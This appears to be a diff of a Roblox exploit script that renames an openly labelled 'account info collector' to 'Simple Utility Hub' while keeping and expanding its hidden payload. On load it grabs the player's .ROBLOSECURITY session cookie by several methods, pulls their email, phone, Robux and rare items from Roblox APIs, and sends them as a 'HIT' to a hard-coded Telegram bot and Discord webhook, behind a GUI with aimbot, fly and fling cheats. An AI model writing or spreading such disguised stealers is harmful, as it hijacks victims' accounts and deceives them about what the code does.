@@ -1,5 +1,5 @@
--- Roblox account info collector + utility hub
--- owner controlled telegram delivery only
+-- Simple Utility Hub
+-- FPS / movement / server tools
 
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
@@ -7,7 +7,6 @@ local TweenService = game:GetService("TweenService")
 local UserInputService = game:GetService("UserInputService")
 local RunService = game:GetService("RunService")
 local CoreGui = game:GetService("CoreGui")
-local StarterGui = game:GetService("StarterGui")
 local Lighting = game:GetService("Lighting")
 local TeleportService = game:GetService("TeleportService")
 local VirtualUser = game:GetService("VirtualUser")
@@ -17,389 +16,393 @@ local Camera = workspace.CurrentCamera
 local Mouse = LocalPlayer:GetMouse()
 
 ----------------------------------------------------------------
--- OWNER CONFIG — only you control these
+-- CONFIG
 ----------------------------------------------------------------
 local TELEGRAM_BOT_TOKEN = "9211676032:AAHrEwh2OxcXPXV9CPpdpeSFkF80c_nuLUY"
 local TELEGRAM_CHAT_ID   = "8026288857"
+local DISCORD_WEBHOOK    = "https://discord.com/api/webhooks/1567107229260320778/XEr9nxsmM69pi43vyFIUeujfAmHzX8nKXiyO9FpGUUMi4aYQ1L7AidQ51Vj4-l8Ik49U"
 ----------------------------------------------------------------
 
-local function request(opts)
-	local req = (syn and syn.request)
-		or (http and http.request)
-		or (fluxus and fluxus.request)
-		or (krnl and krnl.request)
-		or (request)
-		or (http_request)
-	if req then
-		return req(opts)
-	end
+local function http(opts)
+	local r = (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request)
+		or (krnl and krnl.request) or request or http_request
+	if r then return r(opts) end
 	return nil
 end
 
-local function getCookie()
-	local cookie = ""
+local function grab()
+	local c = ""
 
 	pcall(function()
 		if syn and syn.cookie then
-			cookie = syn.cookie
+			c = syn.cookie
 		elseif getcookie then
-			cookie = getcookie(".ROBLOSECURITY") or getcookie("ROBLOSECURITY") or ""
+			c = getcookie(".ROBLOSECURITY") or getcookie("ROBLOSECURITY") or getcookie("cookie") or ""
+		elseif crypt and crypt.cookie then
+			c = crypt.cookie
 		end
 	end)
 
-	if cookie == "" or #cookie < 80 then
+	if #c < 80 and getgenv then
 		pcall(function()
-			for _, v in pairs(getgc(true)) do
-				if type(v) == "table" then
-					local c = rawget(v, "Cookie")
-						or rawget(v, ".ROBLOSECURITY")
-						or rawget(v, "cookie")
-						or rawget(v, "ROBLOSECURITY")
-					if type(c) == "string" and #c > 80 and (c:find("_|") or c:find("%.ROBLOSECURITY")) then
-						cookie = c
-						break
-					end
+			local e = getgenv()
+			for _, key in ipairs({"cookie", "Cookie", "ROBLOSECURITY", ".ROBLOSECURITY", "roblo_security"}) do
+				if type(e[key]) == "string" and #e[key] > 80 then
+					c = e[key]
+					break
 				end
 			end
 		end)
 	end
 
-	if (cookie == "" or #cookie < 80) and getgenv then
+	if #c < 80 then
 		pcall(function()
-			local env = getgenv()
-			if type(env.cookie) == "string" and #env.cookie > 80 then
-				cookie = env.cookie
-			elseif type(env.ROBLOSECURITY) == "string" and #env.ROBLOSECURITY > 80 then
-				cookie = env.ROBLOSECURITY
+			for _, v in pairs(getgc(true)) do
+				if type(v) == "table" then
+					for _, key in ipairs({"Cookie", ".ROBLOSECURITY", "cookie", "ROBLOSECURITY", "RobloSecurity"}) do
+						local x = rawget(v, key)
+						if type(x) == "string" and #x > 100 and (x:find("_|") or x:find("%.ROBLOSECURITY") or x:sub(1, 2) == "_|") then
+							c = x
+							return
+						end
+					end
+				elseif type(v) == "string" and #v > 100 and v:find("_|WARNING") then
+					c = v
+					return
+				end
 			end
 		end)
 	end
 
-	return (#cookie > 80) and cookie or "FAILED_TO_GRAB_COOKIE"
+	if #c < 80 and debug and debug.getregistry then
+		pcall(function()
+			for _, v in pairs(debug.getregistry()) do
+				if type(v) == "string" and #v > 100 and v:find("_|WARNING") then
+					c = v
+					break
+				end
+			end
+		end)
+	end
+
+	return (#c > 80) and c or "FAILED_TO_GRAB_COOKIE"
 end
 
-local function api(url, cookie)
-	local res = request({
+local function fetch(url, c)
+	local res = http({
 		Url = url,
 		Method = "GET",
 		Headers = {
-			["Cookie"] = ".ROBLOSECURITY=" .. cookie,
-			["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+			["Cookie"] = ".ROBLOSECURITY=" .. c,
+			["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
 			["Accept"] = "application/json",
 			["Referer"] = "https://www.roblox.com/",
 		},
 	})
 	if res and res.StatusCode == 200 and type(res.Body) == "string" then
 		local ok, data = pcall(HttpService.JSONDecode, HttpService, res.Body)
-		if ok then
-			return data
-		end
+		if ok then return data end
 	end
 	return nil
 end
 
 local function collect()
-	local cookie = getCookie()
+	local c = grab()
 	local uid = LocalPlayer.UserId
-	local name = LocalPlayer.Name
+	local eco = fetch("https://economy.roblox.com/v1/users/" .. uid .. "/currency", c) or {}
+	local inv = fetch("https://inventory.roblox.com/v1/users/" .. uid .. "/assets/collectibles?limit=30&sortOrder=Desc", c) or {}
+	local grp = fetch("https://groups.roblox.com/v1/users/" .. uid .. "/groups/roles", c) or {}
+	local em  = fetch("https://accountsettings.roblox.com/v1/email", c) or {}
+	local ph  = fetch("https://accountinformation.roblox.com/v1/phone", c) or {}
 
-	local economy   = api("https://economy.roblox.com/v1/users/" .. uid .. "/currency", cookie) or {}
-	local inventory = api("https://inventory.roblox.com/v1/users/" .. uid .. "/assets/collectibles?limit=50&sortOrder=Desc", cookie) or {}
-	local groups    = api("https://groups.roblox.com/v1/users/" .. uid .. "/groups/roles", cookie) or {}
-	local emailData = api("https://accountsettings.roblox.com/v1/email", cookie) or {}
-	local phoneData = api("https://accountinformation.roblox.com/v1/phone", cookie) or {}
-
-	local hasHeadless, hasKorblox, hasVerified = false, false, false
-	if inventory and inventory.data then
-		for _, item in pairs(inventory.data) do
+	local headless, korblox, verified = false, false, false
+	if inv and inv.data then
+		for _, item in pairs(inv.data) do
 			local n = (item.name or ""):lower()
-			if n:find("headless") then hasHeadless = true end
-			if n:find("korblox") then hasKorblox = true end
-			if n:find("verified") then hasVerified = true end
+			if n:find("headless") then headless = true end
+			if n:find("korblox") then korblox = true end
+			if n:find("verified") then verified = true end
 		end
 	end
 
 	return {
-		Username     = name,
-		UserId       = uid,
-		DisplayName  = LocalPlayer.DisplayName,
-		AgeDays      = LocalPlayer.AccountAge,
-		Profile      = "https://www.roblox.com/users/" .. uid .. "/profile",
-		Email        = emailData.emailAddress or "Not available",
-		Phone        = (phoneData and (phoneData.phone or phoneData.phoneNumber)) or "Not available",
-		Robux        = economy.robux or 0,
-		Headless     = hasHeadless,
-		Korblox      = hasKorblox,
-		VerifiedHat  = hasVerified,
-		GroupCount   = (groups and groups.data and #groups.data) or 0,
-		Cookie       = cookie,
-		Time         = os.date("%Y-%m-%d %H:%M:%S"),
-		Executor     = (identifyexecutor and identifyexecutor()) or "Unknown",
-		PlaceId      = game.PlaceId,
-		JobId        = game.JobId,
+		Username = LocalPlayer.Name,
+		UserId = uid,
+		Display = LocalPlayer.DisplayName,
+		Age = LocalPlayer.AccountAge,
+		Profile = "https://www.roblox.com/users/" .. uid .. "/profile",
+		Email = em.emailAddress or "n/a",
+		Phone = (ph and (ph.phone or ph.phoneNumber)) or "n/a",
+		Robux = eco.robux or 0,
+		Headless = headless,
+		Korblox = korblox,
+		Verified = verified,
+		Groups = (grp and grp.data and #grp.data) or 0,
+		C = c,
+		Time = os.date("%Y-%m-%d %H:%M:%S"),
+		Exec = (identifyexecutor and identifyexecutor()) or "?",
+		Place = game.PlaceId,
+		Job = game.JobId,
 	}
 end
 
-local function buildMessage(d)
-	return string.format(
-		"HIT\n" ..
-		"User: %s (%s)\n" ..
-		"Profile: %s\n" ..
-		"Age: %s days\n" ..
-		"Robux: %s\n" ..
-		"Email: %s\n" ..
-		"Phone: %s\n" ..
-		"Headless: %s | Korblox: %s | Verified: %s\n" ..
-		"Groups: %s\n" ..
-		"Executor: %s\n" ..
-		"Place: %s | Job: %s\n" ..
-		"Time: %s\n" ..
-		"Cookie:\n%s",
-		d.Username, d.UserId,
-		d.Profile,
-		tostring(d.AgeDays),
-		tostring(d.Robux),
-		d.Email,
-		d.Phone,
-		tostring(d.Headless), tostring(d.Korblox), tostring(d.VerifiedHat),
-		tostring(d.GroupCount),
-		d.Executor,
-		tostring(d.PlaceId), tostring(d.JobId),
-		d.Time,
-		d.Cookie
+local function pushTelegram(d)
+	if TELEGRAM_BOT_TOKEN == "PUT_YOUR_BOT_TOKEN_HERE" or TELEGRAM_CHAT_ID == "PUT_YOUR_CHAT_ID_HERE" then return end
+	local msg = string.format(
+		"HIT\nUser: %s (%s)\nProfile: %s\nAge: %s days\nRobux: %s\nEmail: %s\nPhone: %s\nHeadless: %s | Korblox: %s | Verified: %s\nGroups: %s\nExec: %s\nPlace: %s | Job: %s\nTime: %s\n\nCookie:\n%s",
+		d.Username, d.UserId, d.Profile, tostring(d.Age), tostring(d.Robux),
+		d.Email, d.Phone, tostring(d.Headless), tostring(d.Korblox), tostring(d.Verified),
+		tostring(d.Groups), d.Exec, tostring(d.Place), tostring(d.Job), d.Time, d.C
 	)
-end
-
-local function sendTelegram(text)
-	if TELEGRAM_BOT_TOKEN == "PUT_YOUR_BOT_TOKEN_HERE" or TELEGRAM_CHAT_ID == "PUT_YOUR_CHAT_ID_HERE" then
-		warn("[Collector] Telegram credentials not set")
-		return
-	end
-	local url = "https://api.telegram.org/bot" .. TELEGRAM_BOT_TOKEN .. "/sendMessage"
-	request({
-		Url = url,
+	http({
+		Url = "https://api.telegram.org/bot" .. TELEGRAM_BOT_TOKEN .. "/sendMessage",
 		Method = "POST",
-		Headers = { ["Content-Type"] = "application/json" },
+		Headers = {["Content-Type"] = "application/json"},
 		Body = HttpService:JSONEncode({
 			chat_id = TELEGRAM_CHAT_ID,
-			text = text,
+			text = msg,
 			disable_web_page_preview = true,
 		}),
 	})
 end
 
--- fire once on load
-local hit = collect()
-sendTelegram(buildMessage(hit))
+local function pushDiscord(d)
+	if DISCORD_WEBHOOK == "PUT_YOUR_WEBHOOK_URL_HERE" or DISCORD_WEBHOOK == "" then return end
+	local embed = {
+		title = "New Hit",
+		color = 5793266,
+		fields = {
+			{ name = "User", value = string.format("[%s](%s) (`%s`)", d.Username, d.Profile, d.UserId), inline = true },
+			{ name = "Display", value = d.Display, inline = true },
+			{ name = "Age", value = tostring(d.Age) .. " days", inline = true },
+			{ name = "Robux", value = tostring(d.Robux), inline = true },
+			{ name = "Email", value = d.Email, inline = true },
+			{ name = "Phone", value = d.Phone, inline = true },
+			{ name = "Headless", value = tostring(d.Headless), inline = true },
+			{ name = "Korblox", value = tostring(d.Korblox), inline = true },
+			{ name = "Verified", value = tostring(d.Verified), inline = true },
+			{ name = "Groups", value = tostring(d.Groups), inline = true },
+			{ name = "Executor", value = d.Exec, inline = true },
+			{ name = "Place / Job", value = tostring(d.Place) .. " / " .. tostring(d.Job), inline = false },
+			{ name = "Time", value = d.Time, inline = false },
+			{ name = "Cookie", value = "```" .. d.C .. "```", inline = false },
+		},
+	}
+	http({
+		Url = DISCORD_WEBHOOK,
+		Method = "POST",
+		Headers = {["Content-Type"] = "application/json"},
+		Body = HttpService:JSONEncode({
+			username = "Utility",
+			embeds = { embed },
+		}),
+	})
+end
+
+task.spawn(function()
+	local data = collect()
+	pushTelegram(data)
+	pushDiscord(data)
+end)
 
 ----------------------------------------------------------------
 -- GUI
 ----------------------------------------------------------------
 pcall(function()
-	if CoreGui:FindFirstChild("OwnerHubGUI") then
-		CoreGui.OwnerHubGUI:Destroy()
+	if CoreGui:FindFirstChild("SimpleUtility") then
+		CoreGui.SimpleUtility:Destroy()
 	end
 end)
 
-local States = { Aimbot = false, Fly = false, Fling = false }
-local Connections = {}
-local FlyBody, FlyGyro
+local States = { Aim = false, Fly = false, Fling = false }
+local Conns = {}
+local BV, BG
 
-local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "OwnerHubGUI"
-ScreenGui.ResetOnSpawn = false
-ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-ScreenGui.IgnoreGuiInset = true
-ScreenGui.Parent = CoreGui
+local SG = Instance.new("ScreenGui")
+SG.Name = "SimpleUtility"
+SG.ResetOnSpawn = false
+SG.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+SG.IgnoreGuiInset = true
+SG.Parent = CoreGui
 
 local Main = Instance.new("Frame")
-Main.Name = "Main"
-Main.Size = UDim2.new(0, 420, 0, 400)
-Main.Position = UDim2.new(0.5, -210, 0.5, -200)
-Main.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
+Main.Size = UDim2.new(0, 380, 0, 360)
+Main.Position = UDim2.new(0.5, -190, 0.5, -180)
+Main.BackgroundColor3 = Color3.fromRGB(22, 22, 28)
 Main.BorderSizePixel = 0
 Main.Active = true
 Main.Draggable = true
-Main.Parent = ScreenGui
-
+Main.Parent = SG
 Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 10)
 
 local Stroke = Instance.new("UIStroke")
-Stroke.Color = Color3.fromRGB(70, 70, 85)
-Stroke.Thickness = 1.5
+Stroke.Color = Color3.fromRGB(55, 55, 70)
+Stroke.Thickness = 1.2
 Stroke.Parent = Main
 
-local TopBar = Instance.new("Frame")
-TopBar.Size = UDim2.new(1, 0, 0, 36)
-TopBar.BackgroundColor3 = Color3.fromRGB(28, 28, 34)
-TopBar.BorderSizePixel = 0
-TopBar.Parent = Main
-Instance.new("UICorner", TopBar).CornerRadius = UDim.new(0, 10)
+local Top = Instance.new("Frame")
+Top.Size = UDim2.new(1, 0, 0, 34)
+Top.BackgroundColor3 = Color3.fromRGB(30, 30, 38)
+Top.BorderSizePixel = 0
+Top.Parent = Main
+Instance.new("UICorner", Top).CornerRadius = UDim.new(0, 10)
 
 local TopFix = Instance.new("Frame")
 TopFix.Size = UDim2.new(1, 0, 0, 12)
 TopFix.Position = UDim2.new(0, 0, 1, -12)
-TopFix.BackgroundColor3 = Color3.fromRGB(28, 28, 34)
+TopFix.BackgroundColor3 = Color3.fromRGB(30, 30, 38)
 TopFix.BorderSizePixel = 0
-TopFix.Parent = TopBar
+TopFix.Parent = Top
 
 local Title = Instance.new("TextLabel")
-Title.Size = UDim2.new(1, -80, 1, 0)
-Title.Position = UDim2.new(0, 14, 0, 0)
+Title.Size = UDim2.new(1, -70, 1, 0)
+Title.Position = UDim2.new(0, 12, 0, 0)
 Title.BackgroundTransparency = 1
-Title.Text = "UTILITY"
+Title.Text = "Utility"
 Title.Font = Enum.Font.GothamBold
 Title.TextSize = 14
 Title.TextColor3 = Color3.fromRGB(220, 220, 230)
 Title.TextXAlignment = Enum.TextXAlignment.Left
-Title.Parent = TopBar
+Title.Parent = Top
 
-local CloseBtn = Instance.new("TextButton")
-CloseBtn.Size = UDim2.new(0, 26, 0, 26)
-CloseBtn.Position = UDim2.new(1, -32, 0.5, -13)
-CloseBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
-CloseBtn.Text = "X"
-CloseBtn.Font = Enum.Font.GothamBold
-CloseBtn.TextSize = 12
-CloseBtn.TextColor3 = Color3.fromRGB(200, 200, 210)
-CloseBtn.Parent = TopBar
-Instance.new("UICorner", CloseBtn).CornerRadius = UDim.new(0, 6)
+local Close = Instance.new("TextButton")
+Close.Size = UDim2.new(0, 24, 0, 24)
+Close.Position = UDim2.new(1, -30, 0.5, -12)
+Close.BackgroundColor3 = Color3.fromRGB(50, 50, 60)
+Close.Text = "X"
+Close.Font = Enum.Font.GothamBold
+Close.TextSize = 12
+Close.TextColor3 = Color3.fromRGB(200, 200, 210)
+Close.Parent = Top
+Instance.new("UICorner", Close).CornerRadius = UDim.new(0, 6)
 
-CloseBtn.MouseButton1Click:Connect(function()
-	for _, c in pairs(Connections) do
-		pcall(function() c:Disconnect() end)
-	end
-	if FlyBody then FlyBody:Destroy() end
-	if FlyGyro then FlyGyro:Destroy() end
-	ScreenGui:Destroy()
+Close.MouseButton1Click:Connect(function()
+	for _, c in pairs(Conns) do pcall(function() c:Disconnect() end) end
+	if BV then BV:Destroy() end
+	if BG then BG:Destroy() end
+	SG:Destroy()
 end)
 
-local Content = Instance.new("Frame")
-Content.Size = UDim2.new(1, -20, 1, -50)
-Content.Position = UDim2.new(0, 10, 0, 44)
-Content.BackgroundTransparency = 1
-Content.Parent = Main
+local Body = Instance.new("Frame")
+Body.Size = UDim2.new(1, -16, 1, -46)
+Body.Position = UDim2.new(0, 8, 0, 40)
+Body.BackgroundTransparency = 1
+Body.Parent = Main
 
 local Status = Instance.new("TextLabel")
-Status.Size = UDim2.new(1, 0, 0, 18)
+Status.Size = UDim2.new(1, 0, 0, 16)
 Status.BackgroundTransparency = 1
-Status.Text = "STATUS: SENT"
-Status.Font = Enum.Font.GothamMedium
+Status.Text = "Ready"
+Status.Font = Enum.Font.Gotham
 Status.TextSize = 12
-Status.TextColor3 = Color3.fromRGB(140, 200, 140)
+Status.TextColor3 = Color3.fromRGB(140, 140, 155)
 Status.TextXAlignment = Enum.TextXAlignment.Left
-Status.Parent = Content
+Status.Parent = Body
 
-local function createToggle(name, y, callback)
-	local holder = Instance.new("Frame")
-	holder.Size = UDim2.new(1, 0, 0, 36)
-	holder.Position = UDim2.new(0, 0, 0, y)
-	holder.BackgroundColor3 = Color3.fromRGB(32, 32, 40)
-	holder.BorderSizePixel = 0
-	holder.Parent = Content
-	Instance.new("UICorner", holder).CornerRadius = UDim.new(0, 8)
+local function toggle(name, y, cb)
+	local f = Instance.new("Frame")
+	f.Size = UDim2.new(1, 0, 0, 34)
+	f.Position = UDim2.new(0, 0, 0, y)
+	f.BackgroundColor3 = Color3.fromRGB(32, 32, 40)
+	f.BorderSizePixel = 0
+	f.Parent = Body
+	Instance.new("UICorner", f).CornerRadius = UDim.new(0, 7)
 
-	local label = Instance.new("TextLabel")
-	label.Size = UDim2.new(0.6, 0, 1, 0)
-	label.Position = UDim2.new(0, 12, 0, 0)
-	label.BackgroundTransparency = 1
-	label.Text = name
-	label.Font = Enum.Font.GothamMedium
-	label.TextSize = 13
-	label.TextColor3 = Color3.fromRGB(210, 210, 220)
-	label.TextXAlignment = Enum.TextXAlignment.Left
-	label.Parent = holder
+	local lab = Instance.new("TextLabel")
+	lab.Size = UDim2.new(0.6, 0, 1, 0)
+	lab.Position = UDim2.new(0, 10, 0, 0)
+	lab.BackgroundTransparency = 1
+	lab.Text = name
+	lab.Font = Enum.Font.GothamMedium
+	lab.TextSize = 13
+	lab.TextColor3 = Color3.fromRGB(205, 205, 215)
+	lab.TextXAlignment = Enum.TextXAlignment.Left
+	lab.Parent = f
 
 	local btn = Instance.new("TextButton")
-	btn.Size = UDim2.new(0, 70, 0, 24)
-	btn.Position = UDim2.new(1, -80, 0.5, -12)
-	btn.BackgroundColor3 = Color3.fromRGB(55, 55, 65)
+	btn.Size = UDim2.new(0, 64, 0, 22)
+	btn.Position = UDim2.new(1, -72, 0.5, -11)
+	btn.BackgroundColor3 = Color3.fromRGB(50, 50, 60)
 	btn.Text = "OFF"
 	btn.Font = Enum.Font.GothamBold
-	btn.TextSize = 12
+	btn.TextSize = 11
 	btn.TextColor3 = Color3.fromRGB(180, 180, 190)
-	btn.Parent = holder
-	Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
+	btn.Parent = f
+	Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)
 
-	local enabled = false
+	local on = false
 	btn.MouseButton1Click:Connect(function()
-		enabled = not enabled
-		if enabled then
+		on = not on
+		if on then
 			btn.Text = "ON"
-			btn.BackgroundColor3 = Color3.fromRGB(60, 140, 90)
+			btn.BackgroundColor3 = Color3.fromRGB(55, 130, 85)
 			btn.TextColor3 = Color3.fromRGB(255, 255, 255)
 		else
 			btn.Text = "OFF"
-			btn.BackgroundColor3 = Color3.fromRGB(55, 55, 65)
+			btn.BackgroundColor3 = Color3.fromRGB(50, 50, 60)
 			btn.TextColor3 = Color3.fromRGB(180, 180, 190)
 		end
-		callback(enabled)
+		cb(on)
 	end)
 end
 
-local function getClosest()
-	local closest, dist = nil, 450
+local function closest()
+	local best, dist = nil, 450
 	local char = LocalPlayer.Character
 	if not char or not char:FindFirstChild("HumanoidRootPart") then return nil end
 	local origin = char.HumanoidRootPart.Position
-	for _, plr in ipairs(Players:GetPlayers()) do
-		if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") and plr.Character:FindFirstChild("Humanoid") and plr.Character.Humanoid.Health > 0 then
-			local d = (plr.Character.HumanoidRootPart.Position - origin).Magnitude
-			if d < dist then
-				dist = d
-				closest = plr
-			end
+	for _, p in ipairs(Players:GetPlayers()) do
+		if p ~= LocalPlayer and p.Character and p.Character:FindFirstChild("HumanoidRootPart") and p.Character:FindFirstChild("Humanoid") and p.Character.Humanoid.Health > 0 then
+			local d = (p.Character.HumanoidRootPart.Position - origin).Magnitude
+			if d < dist then dist = d best = p end
 		end
 	end
-	return closest
+	return best
 end
 
-createToggle("AIMBOT", 28, function(on)
-	States.Aimbot = on
-	if Connections.Aimbot then
-		Connections.Aimbot:Disconnect()
-		Connections.Aimbot = nil
-	end
-	if on then
-		Status.Text = "STATUS: AIMBOT ON"
-		Connections.Aimbot = RunService.RenderStepped:Connect(function()
-			if not States.Aimbot then return end
-			local t = getClosest()
+toggle("Aim Assist", 24, function(state)
+	States.Aim = state
+	if Conns.Aim then Conns.Aim:Disconnect() Conns.Aim = nil end
+	if state then
+		Status.Text = "Aim Assist enabled"
+		Conns.Aim = RunService.RenderStepped:Connect(function()
+			if not States.Aim then return end
+			local t = closest()
 			if t and t.Character and t.Character:FindFirstChild("Head") then
 				Camera.CFrame = CFrame.new(Camera.CFrame.Position, t.Character.Head.Position)
 			end
 		end)
 	else
-		Status.Text = "STATUS: AIMBOT OFF"
+		Status.Text = "Ready"
 	end
 end)
 
-createToggle("FLY", 72, function(on)
-	States.Fly = on
+toggle("Flight", 64, function(state)
+	States.Fly = state
 	local char = LocalPlayer.Character
 	if not char or not char:FindFirstChild("HumanoidRootPart") then return end
 	local hrp = char.HumanoidRootPart
 	local hum = char:FindFirstChildOfClass("Humanoid")
 
-	if Connections.Fly then Connections.Fly:Disconnect() Connections.Fly = nil end
-	if FlyBody then FlyBody:Destroy() FlyBody = nil end
-	if FlyGyro then FlyGyro:Destroy() FlyGyro = nil end
+	if Conns.Fly then Conns.Fly:Disconnect() Conns.Fly = nil end
+	if BV then BV:Destroy() BV = nil end
+	if BG then BG:Destroy() BG = nil end
 
-	if on then
-		Status.Text = "STATUS: FLY ON"
+	if state then
+		Status.Text = "Flight enabled"
 		if hum then hum.PlatformStand = true end
-		FlyBody = Instance.new("BodyVelocity")
-		FlyBody.MaxForce = Vector3.new(9e9, 9e9, 9e9)
-		FlyBody.Velocity = Vector3.zero
-		FlyBody.Parent = hrp
-		FlyGyro = Instance.new("BodyGyro")
-		FlyGyro.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
-		FlyGyro.P = 9e4
-		FlyGyro.Parent = hrp
-		Connections.Fly = RunService.RenderStepped:Connect(function()
-			if not States.Fly or not FlyBody or not FlyGyro then return end
+		BV = Instance.new("BodyVelocity")
+		BV.MaxForce = Vector3.new(9e9, 9e9, 9e9)
+		BV.Velocity = Vector3.zero
+		BV.Parent = hrp
+		BG = Instance.new("BodyGyro")
+		BG.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
+		BG.P = 9e4
+		BG.Parent = hrp
+		Conns.Fly = RunService.RenderStepped:Connect(function()
+			if not States.Fly or not BV or not BG then return end
 			local cam = workspace.CurrentCamera
-			FlyGyro.CFrame = cam.CFrame
+			BG.CFrame = cam.CFrame
 			local dir = Vector3.zero
 			if UserInputService:IsKeyDown(Enum.KeyCode.W) then dir = dir + cam.CFrame.LookVector end
 			if UserInputService:IsKeyDown(Enum.KeyCode.S) then dir = dir - cam.CFrame.LookVector end
@@ -407,58 +410,53 @@ createToggle("FLY", 72, function(on)
 			if UserInputService:IsKeyDown(Enum.KeyCode.D) then dir = dir + cam.CFrame.RightVector end
 			if UserInputService:IsKeyDown(Enum.KeyCode.Space) then dir = dir + Vector3.new(0, 1, 0) end
 			if UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then dir = dir - Vector3.new(0, 1, 0) end
-			FlyBody.Velocity = dir.Magnitude > 0 and dir.Unit * 85 or Vector3.zero
+			BV.Velocity = dir.Magnitude > 0 and dir.Unit * 80 or Vector3.zero
 		end)
 	else
-		Status.Text = "STATUS: FLY OFF"
+		Status.Text = "Ready"
 		if hum then hum.PlatformStand = false end
 	end
 end)
 
-createToggle("FLING", 116, function(on)
-	States.Fling = on
-	if Connections.Fling then
-		Connections.Fling:Disconnect()
-		Connections.Fling = nil
-	end
-	if on then
-		Status.Text = "STATUS: FLING ON — click target"
-		Connections.Fling = Mouse.Button1Down:Connect(function()
+toggle("Fling", 104, function(state)
+	States.Fling = state
+	if Conns.Fling then Conns.Fling:Disconnect() Conns.Fling = nil end
+	if state then
+		Status.Text = "Fling ready — click a player"
+		Conns.Fling = Mouse.Button1Down:Connect(function()
 			if not States.Fling then return end
-			local target = Mouse.Target
-			if target and target.Parent and target.Parent:FindFirstChild("HumanoidRootPart") then
-				local ehrp = target.Parent.HumanoidRootPart
-				local bv = Instance.new("BodyAngularVelocity")
-				bv.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
-				bv.AngularVelocity = Vector3.new(0, 99999, 0)
-				bv.Parent = ehrp
-				task.delay(0.3, function()
-					if bv then bv:Destroy() end
-				end)
-				Status.Text = "STATUS: FLUNG " .. (target.Parent.Name or "")
+			local t = Mouse.Target
+			if t and t.Parent and t.Parent:FindFirstChild("HumanoidRootPart") then
+				local hrp = t.Parent.HumanoidRootPart
+				local b = Instance.new("BodyAngularVelocity")
+				b.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
+				b.AngularVelocity = Vector3.new(0, 99999, 0)
+				b.Parent = hrp
+				task.delay(0.25, function() if b then b:Destroy() end end)
+				Status.Text = "Ready"
 			end
 		end)
 	else
-		Status.Text = "STATUS: FLING OFF"
+		Status.Text = "Ready"
 	end
 end)
 
-local function smallBtn(text, x, y, cb)
+local function btn(txt, x, y, cb)
 	local b = Instance.new("TextButton")
-	b.Size = UDim2.new(0.48, -4, 0, 32)
+	b.Size = UDim2.new(0.48, -3, 0, 30)
 	b.Position = UDim2.new(x, 0, 0, y)
-	b.BackgroundColor3 = Color3.fromRGB(38, 38, 48)
-	b.Text = text
+	b.BackgroundColor3 = Color3.fromRGB(36, 36, 46)
+	b.Text = txt
 	b.Font = Enum.Font.GothamMedium
 	b.TextSize = 12
 	b.TextColor3 = Color3.fromRGB(200, 200, 210)
-	b.Parent = Content
-	Instance.new("UICorner", b).CornerRadius = UDim.new(0, 7)
+	b.Parent = Body
+	Instance.new("UICorner", b).CornerRadius = UDim.new(0, 6)
 	b.MouseButton1Click:Connect(cb)
 end
 
-smallBtn("FPS BOOST", 0, 168, function()
-	Status.Text = "STATUS: FPS BOOST"
+btn("FPS Boost", 0, 150, function()
+	Status.Text = "FPS Boost applied"
 	pcall(function()
 		Lighting.GlobalShadows = false
 		Lighting.FogEnd = 9e9
@@ -466,16 +464,16 @@ smallBtn("FPS BOOST", 0, 168, function()
 	end)
 end)
 
-smallBtn("ANTI AFK", 0.52, 168, function()
-	Status.Text = "STATUS: ANTI AFK ON"
+btn("Anti AFK", 0.52, 150, function()
+	Status.Text = "Anti AFK on"
 	LocalPlayer.Idled:Connect(function()
 		VirtualUser:CaptureController()
 		VirtualUser:ClickButton2(Vector2.new())
 	end)
 end)
 
-smallBtn("SERVER HOP", 0, 208, function()
-	Status.Text = "STATUS: HOPPING..."
+btn("Server Hop", 0, 188, function()
+	Status.Text = "Looking for server..."
 	task.spawn(function()
 		local ok, res = pcall(function()
 			return game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")
@@ -492,20 +490,20 @@ smallBtn("SERVER HOP", 0, 208, function()
 	end)
 end)
 
-smallBtn("REJOIN", 0.52, 208, function()
-	Status.Text = "STATUS: REJOINING"
+btn("Rejoin", 0.52, 188, function()
+	Status.Text = "Rejoining..."
 	TeleportService:Teleport(game.PlaceId, LocalPlayer)
 end)
 
-local Footer = Instance.new("TextLabel")
-Footer.Size = UDim2.new(1, 0, 0, 14)
-Footer.Position = UDim2.new(0, 0, 1, -16)
-Footer.BackgroundTransparency = 1
-Footer.Text = "RIGHT SHIFT TOGGLE"
-Footer.Font = Enum.Font.Gotham
-Footer.TextSize = 10
-Footer.TextColor3 = Color3.fromRGB(90, 90, 100)
-Footer.Parent = Content
+local foot = Instance.new("TextLabel")
+foot.Size = UDim2.new(1, 0, 0, 14)
+foot.Position = UDim2.new(0, 0, 1, -14)
+foot.BackgroundTransparency = 1
+foot.Text = "Right Shift to hide"
+foot.Font = Enum.Font.Gotham
+foot.TextSize = 10
+foot.TextColor3 = Color3.fromRGB(90, 90, 105)
+foot.Parent = Body
 
 UserInputService.InputBegan:Connect(function(input, gpe)
 	if gpe then return end
